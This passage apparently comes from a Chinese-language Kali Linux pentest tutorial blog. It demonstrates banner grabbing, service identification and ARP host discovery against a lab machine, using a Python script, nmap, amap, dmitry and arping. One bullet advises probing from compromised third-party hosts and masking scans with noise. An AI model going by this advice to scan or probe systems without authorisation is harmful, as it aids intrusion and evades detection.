<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># python3</span></span><br><span class="line">Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span><br><span class="line">[GCC 10.2.1 20210110] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt; &gt;&gt; import socket</span><br><span class="line">&gt;&gt;&gt; an=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">&gt;&gt;&gt; an.connect((&quot;<span class="number">10.10</span>.<span class="number">10.129</span>&quot;,<span class="number">21</span>))</span><br><span class="line">&gt;&gt;&gt; an.recv(4096)</span><br><span class="line">b<span class="string">&#x27;220 (vsFTPd 2.2.2)\r\n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; an.close()&gt;&gt;&gt; <span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>
<p><strong>ban_grab.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage - ./banner_grab.py  [Target-IP]  [First Port]  [Last Port]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example - ./banner_grab.py  10.10.10.1  1  100&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example will grab banners for TCP ports 1 through 100 on 10.10.10.1&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">start=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">end=<span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bangrab = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="comment">#建立TCP连接</span></span><br><span class="line">        bangrab.connect((ip,port))</span><br><span class="line">        ready = select.select([bangrab],[],[],<span class="number">1</span>)<span class="comment">#存储banner返回信息</span></span><br><span class="line">        <span class="keyword">if</span> ready[<span class="number">0</span>]:<span class="comment">#判断是否允许抓取banner</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;TCP Port &quot;</span>+<span class="built_in">str</span>(port)+<span class="string">&quot; - &quot;</span>+<span class="built_in">str</span>(bangrab.recv(<span class="number">4096</span>)))</span><br><span class="line">            bangrab.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># python3 ./ban_grab.py 10.10.10.129 1 100</span></span><br><span class="line">TCP Port 21 - b<span class="string">&#x27;220 (vsFTPd 2.2.2)\r\n&#x27;</span></span><br><span class="line">TCP Port 22 - b<span class="string">&#x27;SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="dmitry">3、dmitry</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># dmitry -pb 10.10.10.129</span></span><br><span class="line">Deepmagic Information Gathering Tool</span><br><span class="line"><span class="string">&quot;There be some deep magic going on&quot;</span></span><br><span class="line"></span><br><span class="line">ERROR: Unable to locate Host Name <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Continuing with limited modules</span><br><span class="line">HostIP:10.10.10.129</span><br><span class="line">HostName:</span><br><span class="line"></span><br><span class="line">Gathered TCP Port information <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"> Port           State</span><br><span class="line"></span><br><span class="line">21 /tcp          open</span><br><span class="line">&gt;&gt; 220 (vsFTPd 2.2.2)</span><br><span class="line"></span><br><span class="line">22/tcp          open</span><br><span class="line">&gt;&gt; SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4</span><br><span class="line"></span><br><span class="line">80/tcp          open</span><br><span class="line">zsh: segmentation fault  dmitry -pb 10.10.10.129</span><br></pre></td></tr></table></figure>
<h3 id="nmap">4、nmap</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT 10.10.10.129 -p 21 --script=banner</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 09:08 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00046s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">|_banner: 220 (vsFTPd 2.2.2)</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.76 seconds</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># nmap -sT 10.10.10.129 -p 1-100 --script=banner.nse</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 09:09 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00082s latency).</span><br><span class="line">Not shown: 97 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">|_banner: 220 (vsFTPd 2.2.2)</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">|_banner: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.35 seconds</span><br></pre></td></tr></table></figure>
<h3 id="amap">5、amap</h3>
<p><strong>amap 专门用于识别指定端口上运行服务的banner信息</strong></p>
<p><strong>安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># apt-get installamap </span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  amap</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 135 not upgraded.</span><br><span class="line">Need to get 68.2 kB of archives.</span><br><span class="line">After this operation, 181 kB of additional disk space will be used.</span><br><span class="line">Get:1 http://mirrors.neusoft.edu.cn/kali kali-rolling/main amd64 amap amd64 5.4-4kali2 [68.2 kB]</span><br><span class="line">Fetched 68.2 kB <span class="keyword">in</span> 3s (24.5 kB/s)</span><br><span class="line">Selecting previously unselected package amap.</span><br><span class="line">(Reading database ... 271263 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../amap_5.4-4kali2_amd64.deb ...</span><br><span class="line">Unpacking amap (5.4-4kali2) ...</span><br><span class="line">Setting up amap (5.4-4kali2) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> kali-menu (2021.3.3) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> man-db (2.9.4-2) ...</span><br></pre></td></tr></table></figure>
<p><strong>帮助信息：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap -h</span></span><br><span class="line">amap v5.4 (c) 2011 by van Hauser &lt;vh@thc.org&gt; www.thc.org/thc-amap</span><br><span class="line">Syntax: amap [-A|-B|-P|-W] [-1buSRHUdqv] [[-m] -o &lt;file&gt;] [-D &lt;file&gt;] [-t/-T sec] [-c cons] [-C retries] [-p proto] [-i &lt;file&gt;] [target port [port] ...]</span><br><span class="line">Modes:</span><br><span class="line">  -A         Map applications: send triggers and analyse responses (default)</span><br><span class="line">  -B         Just grab banners, <span class="keyword">do</span> not send triggers</span><br><span class="line">  -P         No banner or application stuff - be a (full connect) port scanner</span><br><span class="line">Options:</span><br><span class="line">  -1         Only send triggers to a port <span class="keyword">until</span> 1st identification. Speeeeed!</span><br><span class="line">  -6         Use IPv6 instead of IPv4</span><br><span class="line">  -b         Print ascii banner of responses</span><br><span class="line">  -i FILE    Nmap machine readable outputfile to <span class="built_in">read</span> ports from</span><br><span class="line">  -u         Ports specified on commandline are UDP (default is TCP)</span><br><span class="line">  -R         Do NOT identify RPC service</span><br><span class="line">  -H         Do NOT send application triggers marked as potentially harmful</span><br><span class="line">  -U         Do NOT dump unrecognised responses (better <span class="keyword">for</span> scripting)</span><br><span class="line">  -d         Dump all responses</span><br><span class="line">  -v         Verbose mode, use twice (or more!) <span class="keyword">for</span> debug (not recommended :-)</span><br><span class="line">  -q         Do not report closed ports, and <span class="keyword">do</span> not <span class="built_in">print</span> them as unidentified</span><br><span class="line">  -o FILE [-m] Write output to file FILE, -m creates machine readable output</span><br><span class="line">  -c CONS    Amount of parallel connections to make (default 32, max 256)</span><br><span class="line">  -C RETRIES Number of reconnects on connect timeouts (see -T) (default 3)</span><br><span class="line">  -T SEC     Connect <span class="built_in">timeout</span> on connection attempts <span class="keyword">in</span> seconds (default 5)</span><br><span class="line">  -t SEC     Response <span class="built_in">wait</span> <span class="built_in">timeout</span> <span class="keyword">in</span> seconds (default 5)</span><br><span class="line">  -p PROTO   Only send triggers <span class="keyword">for</span> this protocol (e.g. ftp)</span><br><span class="line">  TARGET PORT   The target address and port(s) to scan (additional to -i)</span><br><span class="line">amap is a tool to identify application protocols on target ports.</span><br><span class="line">Note: this version was NOT compiled with SSL support!</span><br><span class="line">Usage hint: Options <span class="string">&quot;-bqv&quot;</span> are recommended, add <span class="string">&quot;-1&quot;</span> <span class="keyword">for</span> fast/rush checks.</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># amap -B 10.10.10.129 22                                                          255 ⨯</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:13:00 - BANNER mode</span><br><span class="line"></span><br><span class="line">Banner on 10.10.10.129:22/tcp : SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4\r\n</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:13:01 </span><br><span class="line">┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap -B 10.10.10.129 21</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:13:07 - BANNER mode</span><br><span class="line"></span><br><span class="line">Banner on 10.10.10.129:21/tcp : 220 (vsFTPd 2.2.2)\r\n</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:13:07 </span><br><span class="line">┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap -B 10.10.10.129 1-200</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:13:30 - BANNER mode</span><br><span class="line"></span><br><span class="line">Banner on 10.10.10.129:143/tcp : * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION] Courier-IMAP ready. Copyright 1998-2008 Double Precision, Inc.  See COPYING <span class="keyword">for</span> distribution information.\r\n</span><br><span class="line">Banner on 10.10.10.129:21/tcp : 220 (vsFTPd 2.2.2)\r\n</span><br><span class="line">Banner on 10.10.10.129:22/tcp : SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4\r\n</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:13:42</span><br></pre></td></tr></table></figure>
<h2 id="服务识别">3. 服务识别</h2>
<p><strong>Banner信息抓取能力有限</strong></p>
<p><strong>nmap响应特征分析识别服务</strong></p>
<ul>
<li><strong>发送系列复杂的探测</strong></li>
<li><strong>依据响应特征signature</strong></li>
</ul>
<h3 id="nc-1">1、nc</h3>
<p>省略，同2.1</p>
<h3 id="nmap-1">2、nmap</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap 10.10.10.129 -p 1-200 -sV                   </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 09:19 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 195 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.2.2</span><br><span class="line">22/tcp  open  ssh         OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.14 ((Ubuntu) mod_mono/<span class="number">2.4</span>.<span class="number">3</span> PHP/<span class="number">5.3</span>.<span class="number">2</span>-<span class="number">1</span>ubuntu4.<span class="number">5</span> with Suhosin-Patch mod_python/<span class="number">3.3</span>.<span class="number">1</span> Python/<span class="number">2.6</span>.<span class="number">5</span> mod_perl/<span class="number">2.0</span>.<span class="number">4</span> Perl/v5.<span class="number">10.1</span>)</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">143</span>/tcp open  imap        Courier Imapd (released <span class="number">2008</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:DE:<span class="number">5</span>D:BA (VMware)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">21.40</span> seconds</span><br></pre></td></tr></table></figure>
<h3 id="amap-1">3、amap</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># amap 10.10.10.129 80    </span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:19:58 - APPLICATION MAPPING mode</span><br><span class="line"></span><br><span class="line">Protocol on 10.10.10.129:80/tcp matches http</span><br><span class="line">Protocol on 10.10.10.129:80/tcp matches http-apache-2</span><br><span class="line"></span><br><span class="line">Unidentified ports: none.</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:20:04 </span><br><span class="line">┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap 10.10.10.129 20-30</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:20:20 - APPLICATION MAPPING mode</span><br><span class="line"></span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh</span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh-openssh</span><br><span class="line">Protocol on 10.10.10.129:21/tcp matches ftp</span><br><span class="line"></span><br><span class="line">Unidentified ports: 10.10.10.129:20/tcp 10.10.10.129:23/tcp 10.10.10.129:24/tcp 10.10.10.129:25/tcp 10.10.10.129:26/tcp 10.10.10.129:27/tcp 10.10.10.129:28/tcp 10.10.10.129:29/tcp 10.10.10.129:30/tcp (total 9).</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:20:23 </span><br><span class="line">┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap 10.10.10.129 20-30 -q</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:20:44 - APPLICATION MAPPING mode</span><br><span class="line"></span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh</span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh-openssh</span><br><span class="line">Protocol on 10.10.10.129:21/tcp matches ftp</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:20:50 </span><br><span class="line">┌──(root💀kali) -[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># amap 10.10.10.129 20-30 -qb</span></span><br><span class="line">amap v5.4 (www.thc.org/thc-amap) started at 2021-11-30 09:20:54 - APPLICATION MAPPING mode</span><br><span class="line"></span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh - banner: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4\r\n</span><br><span class="line">Protocol on 10.10.10.129:22/tcp matches ssh-openssh - banner: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4\r\n</span><br><span class="line">Protocol on 10.10.10.129:21/tcp matches ftp - banner: 220 (vsFTPd 2.2.2)\r\n</span><br><span class="line"></span><br><span class="line">amap v5.4 finished at 2021-11-30 09:21:01</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>服务扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之主机发现</title>
    <url>/2021/11/19/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="主动信息收集">1. 主动信息收集</h2>
<p><strong>直接与目标系统交互通信</strong></p>
<p><strong>无法避免留下访问的痕迹</strong></p>
<p><strong>使用受控的第三方电脑进行探测</strong></p>
<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好被封杀的准本</li>
<li>使用噪声迷惑目标，淹没真实的探测流量</li>
</ul>
<p><strong>扫描</strong></p>
<ul>
<li>发送不同的探测，根据返回结果判断目标状态</li>
</ul>
<h2 id="主机发现">2. 主机发现</h2>
<p><strong>识别活着的主机</strong></p>
<ul>
<li><strong>潜在的被攻击目标</strong></li>
</ul>
<p><strong>输出一个IP地址列表</strong></p>
<p><strong>2、3、4层发现</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211119215814211-1756463726.png" /></strong></p>
<h2 id="二层链路层发现通常是做内网探测">3.
二层（链路层）发现（通常是做内网探测）</h2>
<p><strong>优点</strong></p>
<ul>
<li>扫描快，可靠</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>不可路由，即仅能探测本网段</li>
</ul>
<h3 id="arping">1、arping</h3>
<p><strong>命令参数（help）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping --help</span></span><br><span class="line">ARPing 2.21, by Thomas Habets &lt;thomas@habets.se&gt;</span><br><span class="line">usage: arping [ -0aAbdDeFpPqrRuUv ] [ -w &lt;sec&gt; ] [ -W &lt;sec&gt; ] [ -S &lt;host/ip&gt; ]</span><br><span class="line">              [ -T &lt;host/ip ] [ -s &lt;MAC&gt; ] [ -t &lt;MAC&gt; ] [ -c &lt;count&gt; ]</span><br><span class="line">              [ -C &lt;count&gt; ] [ -i &lt;interface&gt; ] [ -m &lt;<span class="built_in">type</span>&gt; ] [ -g &lt;group&gt; ]</span><br><span class="line">              [ -V &lt;vlan&gt; ] [ -Q &lt;priority&gt; ] &lt;host/ip/MAC | -B&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">    -0     Use this option to ping with <span class="built_in">source</span> IP address 0.0.0.0. Use this</span><br><span class="line">           when you haven<span class="string">&#x27;t configured your interface yet.  Note that  this</span></span><br><span class="line"><span class="string">           may  get  the  MAC-ping  unanswered.   This  is  an alias for -S</span></span><br><span class="line"><span class="string">           0.0.0.0.</span></span><br><span class="line"><span class="string">    -a     Audiable ping.</span></span><br><span class="line"><span class="string">    -A     Only count addresses matching  requested  address  (This  *WILL*</span></span><br><span class="line"><span class="string">           break  most things you do. Only useful if you are arpinging many</span></span><br><span class="line"><span class="string">           hosts at once. See arping-scan-net.sh for an example).</span></span><br><span class="line"><span class="string">    -b     Like -0 but source broadcast source  address  (255.255.255.255).</span></span><br><span class="line"><span class="string">           Note that this may get the arping unanswered since it&#x27;</span>s not nor-</span><br><span class="line">           mal behavior <span class="keyword">for</span> a host.</span><br><span class="line">    -B     Use instead of host <span class="keyword">if</span> you want to address 255.255.255.255.</span><br><span class="line">    -c count</span><br><span class="line">           Only send count requests.</span><br><span class="line">    -C count</span><br><span class="line">           Only <span class="built_in">wait</span> <span class="keyword">for</span> this many replies, regardless of -c and -w.</span><br><span class="line">    -d     Find duplicate replies. Exit with 1 <span class="keyword">if</span> there are answers from</span><br><span class="line">           two different MAC addresses.</span><br><span class="line">    -D     Display answers as exclamation points and missing packets as dots.</span><br><span class="line">    -e     Like -a but beep when there is no reply.</span><br><span class="line">    -F     Don<span class="string">&#x27;t try to be smart about the interface name.  (even  if  this</span></span><br><span class="line"><span class="string">           switch is not given, -i overrides smartness)</span></span><br><span class="line"><span class="string">    -g group</span></span><br><span class="line"><span class="string">           setgid() to this group instead of the nobody group.</span></span><br><span class="line"><span class="string">    -h     Displays a help message and exits.</span></span><br><span class="line"><span class="string">    -i interface</span></span><br><span class="line"><span class="string">           Use the specified interface.</span></span><br><span class="line"><span class="string">    -m type</span></span><br><span class="line"><span class="string">           Type of timestamp to use for incoming packets. Use -vv when</span></span><br><span class="line"><span class="string">           pinging to list available ones.</span></span><br><span class="line"><span class="string">    -q     Does not display messages, except error messages.</span></span><br><span class="line"><span class="string">    -Q pri 802.1p priority to set. Should be used with 802.1Q (-V).</span></span><br><span class="line"><span class="string">           Defaults to 0.</span></span><br><span class="line"><span class="string">    -r     Raw output: only the MAC/IP address is displayed for each reply.</span></span><br><span class="line"><span class="string">    -R     Raw output: Like -r but shows &quot;the other one&quot;, can  be  combined</span></span><br><span class="line"><span class="string">           with -r.</span></span><br><span class="line"><span class="string">    -s MAC Set source MAC address. You may need to use -p with this.</span></span><br><span class="line"><span class="string">    -S IP  Like  -b and -0 but with set source address.  Note that this may</span></span><br><span class="line"><span class="string">           get the arping unanswered if the target does not have routing to</span></span><br><span class="line"><span class="string">           the  IP.  If you don&#x27;</span>t own the IP you are using, you may need to</span><br><span class="line">           turn on promiscious mode on the interface (with -p).  With  this</span><br><span class="line">           switch  you can find out what IP-address a host has without tak-</span><br><span class="line">           ing an IP-address yourself.</span><br><span class="line">    -t MAC Set target MAC address to use when pinging IP address.</span><br><span class="line">    -T IP  Use -T as target address when pinging MACs that won<span class="string">&#x27;t respond to</span></span><br><span class="line"><span class="string">           a broadcast ping but perhaps to a directed broadcast.</span></span><br><span class="line"><span class="string">           Example:</span></span><br><span class="line"><span class="string">           To check the address of MAC-A, use knowledge of MAC-B and  IP-B.</span></span><br><span class="line"><span class="string">           $ arping -S &lt;IP-B&gt; -s &lt;MAC-B&gt; -p &lt;MAC-A&gt;</span></span><br><span class="line"><span class="string">    -p     Turn  on  promiscious  mode  on interface, use this if you don&#x27;</span>t</span><br><span class="line">           <span class="string">&quot;own&quot;</span> the MAC address you are using.</span><br><span class="line">    -P     Send ARP replies instead of requests. Useful with -U.</span><br><span class="line">    -u     Show index=received/sent instead  of  just  index=received  when</span><br><span class="line">           pinging MACs.</span><br><span class="line">    -U     Send unsolicited ARP.</span><br><span class="line">    -v     Verbose output. Use twice <span class="keyword">for</span> more messages.</span><br><span class="line">    -V num 802.1Q tag to add. Defaults to no VLAN tag.</span><br><span class="line">    -w sec Specify a <span class="built_in">timeout</span> before ping exits regardless of how many</span><br><span class="line">packets have been sent or received.</span><br><span class="line">    -W sec Time to <span class="built_in">wait</span> between pings.</span><br><span class="line">Report bugs to: thomas@habets.se</span><br><span class="line">Arping home page: &lt;http://www.habets.pp.se/synscan/&gt;</span><br><span class="line">Development repo: http://github.com/ThomasHabets/arping                                                                              </span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li><strong>参数 "-d" 发现重复响应（不同MAC对应同一IP），
即ARP欺骗</strong></li>
<li><strong>arping
不支持对网段的探测，不过可通过脚本间接实现</strong></li>
</ul>
<p><strong>例 1 对10.10.10.1发送4个探测包：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># arping 10.10.10.1 -c 4</span></span><br><span class="line">ARPING 10.10.10.1</span><br><span class="line">60 bytes from 00:50:56:c0:00:08 (10.10.10.1): index=0 time=271.585 usec</span><br><span class="line">60 bytes from 00:50:56:c0:00:08 (10.10.10.1): index=1 time=214.186 usec</span><br><span class="line">60 bytes from 00:50:56:c0:00:08 (10.10.10.1): index=2 time=232.599 usec</span><br><span class="line">60 bytes from 00:50:56:c0:00:08 (10.10.10.1): index=3 time=302.205 usec</span><br><span class="line"></span><br><span class="line">--- 10.10.10.1 statistics ---</span><br><span class="line">4 packets transmitted, 4 packets received,   0% unanswered (0 extra)</span><br><span class="line">rtt min/avg/max/std-dev = 0.214/0.255/0.302/0.034 ms</span><br></pre></td></tr></table></figure>
<p><strong>例 2 提取响应主机IP：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping 192.168.1.101 -c 1                                            </span></span><br><span class="line">ARPING 192.168.1.101</span><br><span class="line">42 bytes from 48:2c:a0:7b:90:cb (192.168.1.101): index=0 time=112.099 msec</span><br><span class="line"></span><br><span class="line">--- 192.168.1.101 statistics ---</span><br><span class="line">1 packets transmitted, 1 packets received,   0% unanswered (0 extra)</span><br><span class="line">rtt min/avg/max/std-dev = 112.099/112.099/112.099/0.000 ms</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping 192.168.1.101 -c 1 | grep &quot;bytes from&quot;   　　　　　　　　　　#输出有响应的主机，目标未响应则不会输出任何信息</span></span><br><span class="line">42 bytes from 48:2c:a0:7b:90:cb (192.168.1.101): index=0 time=63.069 msec</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping 192.168.1.101 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5   #以空格作为分隔符输出第 5 列   </span></span><br><span class="line">(192.168.1.101):</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping 192.168.1.101 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2　　　　#以&quot;（&quot;为分隔符……</span></span><br><span class="line">192.168.1.101):                                                                                      </span><br><span class="line">                                                                                      </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># arping 192.168.1.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 |cut -d&quot;)&quot; -f 1 </span></span><br><span class="line">192.168.1.1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211119223304719-1492992678.png" /></p>
<h3 id="nmap">2、nmap</h3>
<p>略（单独介绍）……</p>
<h3 id="netdiscover">3、netdiscover</h3>
<ul>
<li>** 专用于二层发现**</li>
<li><strong>可用于无线和交换网络</strong></li>
<li><strong>主动和被动探测</strong></li>
</ul>
<p><strong>帮助信息（help）：</strong></p>
